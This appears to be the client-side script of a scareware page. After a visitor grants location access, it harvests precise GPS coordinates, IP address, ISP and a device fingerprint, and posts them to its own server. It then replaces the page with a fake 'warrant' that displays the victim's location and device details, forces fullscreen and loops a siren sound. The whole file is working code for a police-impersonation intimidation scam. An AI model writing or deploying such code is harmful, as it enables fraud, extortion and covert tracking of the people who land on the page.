const button = document.getElementById('allowBtn');

button.addEventListener('click', async () => {
  if (!navigator.geolocation) {
    alert('Geolocation is not supported by your browser');
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const { latitude, longitude } = position.coords;

      try {
        // Collect device information
        const deviceInfo = await collectDeviceInfo();

        // Send location and device info to server for logging
        const response = await fetch('/redirect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ 
            latitude, 
            longitude,
            deviceInfo 
          })
        });

        const data = await response.json();

        if (data.success) {
          // Get city and state from coordinates (reverse geocoding)
          let cityState = `${latitude}, ${longitude}`;
          try {
            const reverseGeoResponse = await fetch(
              `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`
            );
            const reverseGeoData = await reverseGeoResponse.json();
            if (reverseGeoData.address) {
              const addr = reverseGeoData.address;
              const city = addr.city || addr.town || addr.village || addr.municipality || '';
              const state = addr.state || addr.region || '';
              if (city && state) {
                cityState = `${city}, ${state}`;
              } else if (city) {
                cityState = city;
              } else if (state) {
                cityState = state;
              }
            }
          } catch (e) {
            console.log('Reverse geocoding failed, using coordinates');
          }
          
          // Store location in localStorage so amazon.html scripts can use it
          localStorage.setItem('recordedLocation', cityState);
          
          // Store IP in localStorage if available
          if (deviceInfo.ip) {
            localStorage.setItem('recordedIP', deviceInfo.ip);
          }

          // Load amazon.html content
          const amazonResponse = await fetch('/amazon.html');
          const amazonHtml = await amazonResponse.text();
          
          // Create a temporary container to parse the HTML
          const tempDiv = document.createElement('div');
          tempDiv.innerHTML = amazonHtml;
          
          // Extract the warrant-page content (without button-container)
          const warrantPage = tempDiv.querySelector('#warrantPage');
          const amazonStyles = tempDiv.querySelector('style');
          const amazonScripts = tempDiv.querySelectorAll('script');
          const sirenAudio = tempDiv.querySelector('#sirenAudio');
          
          if (warrantPage) {
            // Clone the warrant page first
            const clonedWarrant = warrantPage.cloneNode(true);
            
            // Clear the body and add styles
            document.body.innerHTML = '';
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.style.height = '100vh';
            document.body.style.overflow = 'auto';
            
            if (amazonStyles) {
              // Remove existing styles and add amazon styles
              const existingStyle = document.querySelector('style');
              if (existingStyle) {
                existingStyle.remove();
              }
              document.head.appendChild(amazonStyles.cloneNode(true));
            }
            
            // Add siren audio if it exists
            if (sirenAudio) {
              document.body.appendChild(sirenAudio.cloneNode(true));
            }
            
            // Update values in the cloned warrant before adding to DOM
            const locationElement = clonedWarrant.querySelector('#location');
            const locationElement2 = clonedWarrant.querySelector('#location2');
            const ipElement = clonedWarrant.querySelector('#ipAddress');
            const accessTimeElement = clonedWarrant.querySelector('#accessTime');
            
            if (locationElement) {
              locationElement.textContent = cityState;
            }
            if (locationElement2) {
              locationElement2.textContent = cityState;
            }
            
            // Get IP address
            let userIP = deviceInfo.ip || 'Loading...';
            if (ipElement) {
              ipElement.textContent = userIP;
            }
            
            if (accessTimeElement) {
              accessTimeElement.textContent = new Date().toLocaleString();
            }
            
            // Add the warrant page content
            document.body.appendChild(clonedWarrant);
            
            // Make warrant page visible immediately
            const warrantPageElement = document.getElementById('warrantPage');
            if (warrantPageElement) {
              warrantPageElement.classList.add('active');
              warrantPageElement.style.display = 'block';
            }
            
            // Request fullscreen
            requestFullscreen();
            
            // Execute the scripts from amazon.html (for fullscreen maintenance, etc.)
            amazonScripts.forEach(script => {
              const newScript = document.createElement('script');
              if (script.src) {
                newScript.src = script.src;
              } else {
                newScript.textContent = script.textContent;
              }
              document.body.appendChild(newScript);
            });
            
            // Function to update all values
            const updateValues = () => {
              // Update location in the warrant page (city and state)
              const locationDisplay = document.getElementById('location');
              const locationDisplay2 = document.getElementById('location2');
              
              if (locationDisplay && locationDisplay.textContent !== cityState) {
                locationDisplay.textContent = cityState;
              }
              if (locationDisplay2 && locationDisplay2.textContent !== cityState) {
                locationDisplay2.textContent = cityState;
              }
              
              // Get IP address if not already set
              const ipAddressDisplay = document.getElementById('ipAddress');
              if (ipAddressDisplay) {
                if (deviceInfo.ip && ipAddressDisplay.textContent !== deviceInfo.ip) {
                  ipAddressDisplay.textContent = deviceInfo.ip;
                } else if (!deviceInfo.ip && ipAddressDisplay.textContent === 'Loading...' || ipAddressDisplay.textContent === 'XXX.XXX.XXX.XXX') {
                  fetch('https://api.ipify.org?format=json')
                    .then(ipResponse => ipResponse.json())
                    .then(ipData => {
                      if (ipAddressDisplay) {
                        ipAddressDisplay.textContent = ipData.ip;
                        localStorage.setItem('recordedIP', ipData.ip);
                      }
                    })
                    .catch(e => {
                      if (ipAddressDisplay) {
                        ipAddressDisplay.textContent = 'Unknown';
                      }
                    });
                }
              }
              
              // Update access time
              const accessTimeDisplay = document.getElementById('accessTime');
              if (accessTimeDisplay) {
                accessTimeDisplay.textContent = new Date().toLocaleString();
              }
            };
            
            // Update values immediately after scripts run
            setTimeout(updateValues, 200);
            
            // Keep updating values periodically to prevent overwrites
            const updateInterval = setInterval(updateValues, 500);
            
            // Stop updating after 5 seconds (values should be set by then)
            setTimeout(() => {
              clearInterval(updateInterval);
            }, 5000);
            
            // Add device details section after the existing device information paragraph
            setTimeout(() => {
              const mainContent = document.querySelector('.main-content');
              
              if (mainContent) {
                // Create device details box
                const deviceDetailsBox = document.createElement('div');
                deviceDetailsBox.className = 'details-box';
                deviceDetailsBox.style.marginTop = '20px';
                
                let deviceDetailsHTML = '<h3>DEVICE DETAILS:</h3>';
                
                if (deviceInfo.operatingSystem) {
                  deviceDetailsHTML += `<p><span class="label">Operating System:</span> ${deviceInfo.operatingSystem}</p>`;
                }
                if (deviceInfo.browser) {
                  deviceDetailsHTML += `<p><span class="label">Browser:</span> ${deviceInfo.browser}</p>`;
                }
                if (deviceInfo.screenSize) {
                  deviceDetailsHTML += `<p><span class="label">Screen Size:</span> ${deviceInfo.screenSize}</p>`;
                }
                if (deviceInfo.cpuCores) {
                  deviceDetailsHTML += `<p><span class="label">CPU Cores:</span> ${deviceInfo.cpuCores}</p>`;
                }
                if (deviceInfo.cpuInfo && deviceInfo.cpuInfo !== 'Unknown') {
                  deviceDetailsHTML += `<p><span class="label">CPU Architecture:</span> ${deviceInfo.cpuInfo}</p>`;
                }
                if (deviceInfo.gpu && deviceInfo.gpu !== 'GPU info unavailable' && deviceInfo.gpu !== 'WebGL not available') {
                  deviceDetailsHTML += `<p><span class="label">GPU:</span> ${deviceInfo.gpu}</p>`;
                }
                if (deviceInfo.deviceMemory) {
                  deviceDetailsHTML += `<p><span class="label">Device Memory:</span> ${deviceInfo.deviceMemory} GB</p>`;
                }
                if (deviceInfo.language) {
                  deviceDetailsHTML += `<p><span class="label">Language:</span> ${deviceInfo.language}</p>`;
                }
                if (deviceInfo.timezone) {
                  deviceDetailsHTML += `<p><span class="label">Timezone:</span> ${deviceInfo.timezone}</p>`;
                }
                if (deviceInfo.isp) {
                  deviceDetailsHTML += `<p><span class="label">Internet Provider:</span> ${deviceInfo.isp}</p>`;
                }
                if (deviceInfo.city && deviceInfo.country) {
                  deviceDetailsHTML += `<p><span class="label">IP Location:</span> ${deviceInfo.city}, ${deviceInfo.country}</p>`;
                }
                
                deviceDetailsBox.innerHTML = deviceDetailsHTML;
                
                // Insert after the device information paragraph
                const allParagraphs = Array.from(mainContent.querySelectorAll('p'));
                const deviceInfoParagraph = allParagraphs.find(p => 
                  p.textContent.includes('All device details')
                );
                if (deviceInfoParagraph) {
                  deviceInfoParagraph.parentNode.insertBefore(deviceDetailsBox, deviceInfoParagraph.nextSibling);
                } else {
                  mainContent.appendChild(deviceDetailsBox);
                }
              }
            }, 300);
            
            // Play siren audio if available
            setTimeout(() => {
              const audio = document.getElementById('sirenAudio');
              if (audio) {
                audio.volume = 1.0;
                audio.loop = true;
                audio.play().catch(err => {
                  console.log('Audio play error:', err);
                });
              }
            }, 100);
          }
        }
      } catch (err) {
        console.error('Error:', err);
      }
    },
    (error) => {
      // Location permission denied - do nothing, stay on blank page
      console.log('Location permission denied');
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
});

// Collect device information
async function collectDeviceInfo() {
  const info = {};

  // Operating System
  const userAgent = navigator.userAgent;
  info.userAgent = userAgent;
  
  if (userAgent.includes('Windows')) {
    info.operatingSystem = 'Windows';
  } else if (userAgent.includes('Mac')) {
    info.operatingSystem = 'macOS';
  } else if (userAgent.includes('Linux')) {
    info.operatingSystem = 'Linux';
  } else if (userAgent.includes('Android')) {
    info.operatingSystem = 'Android';
  } else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
    info.operatingSystem = 'iOS';
  } else {
    info.operatingSystem = navigator.platform || 'Unknown';
  }

  // Browser
  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
    info.browser = 'Chrome';
  } else if (userAgent.includes('Firefox')) {
    info.browser = 'Firefox';
  } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
    info.browser = 'Safari';
  } else if (userAgent.includes('Edg')) {
    info.browser = 'Edge';
  } else {
    info.browser = 'Unknown';
  }

  // Screen Size
  info.screenSize = `${screen.width}x${screen.height} (${screen.width * screen.height} pixels)`;

  // CPU Cores
  info.cpuCores = navigator.hardwareConcurrency || 'Unknown';

  // CPU Info (from user agent if available)
  const cpuMatch = userAgent.match(/(x86_64|i386|i686|amd64|arm64|ARM)/i);
  info.cpuInfo = cpuMatch ? cpuMatch[0] : 'Unknown';

  // GPU Information
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
      } else {
        info.gpu = 'WebGL available but renderer info not accessible';
      }
    } else {
      info.gpu = 'WebGL not available';
    }
  } catch (e) {
    info.gpu = 'GPU info unavailable';
  }

  // Device Memory
  if (navigator.deviceMemory) {
    info.deviceMemory = navigator.deviceMemory;
  }

  // Language
  info.language = navigator.language || navigator.userLanguage || 'Unknown';

  // Timezone
  try {
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    info.timezone = timezone;
  } catch (e) {
    info.timezone = 'Unknown';
  }

  // Get IP and ISP information
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;
    info.ip = ip;

    // Get location and ISP info from IP
    try {
      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      const geoData = await geoResponse.json();
      
      if (geoData.city) {
        info.city = geoData.city;
      }
      if (geoData.country_name) {
        info.country = geoData.country_name;
      }
      if (geoData.org) {
        info.isp = geoData.org;
      } else if (geoData.isp) {
        info.isp = geoData.isp;
      }
    } catch (e) {
      // Fallback to alternative API
      try {
        const geoResponse2 = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,country,isp,org`);
        const geoData2 = await geoResponse2.json();
        if (geoData2.status === 'success') {
          if (geoData2.city) info.city = geoData2.city;
          if (geoData2.country) info.country = geoData2.country;
          if (geoData2.isp) info.isp = geoData2.isp;
          else if (geoData2.org) info.isp = geoData2.org;
        }
      } catch (e2) {
        console.log('Could not fetch ISP info');
      }
    }
  } catch (e) {
    console.log('Could not fetch IP address');
  }

  return info;
}

// Fullscreen request function
function requestFullscreen() {
  const element = document.documentElement;
  
  if (element.requestFullscreen) {
    element.requestFullscreen().catch(err => {
      console.log('Fullscreen error:', err);
    });
  } else if (element.webkitRequestFullscreen) {
    element.webkitRequestFullscreen();
  } else if (element.webkitRequestFullScreen) {
    element.webkitRequestFullScreen();
  } else if (element.mozRequestFullScreen) {
    element.mozRequestFullScreen();
  } else if (element.msRequestFullscreen) {
    element.msRequestFullscreen();
  }
}
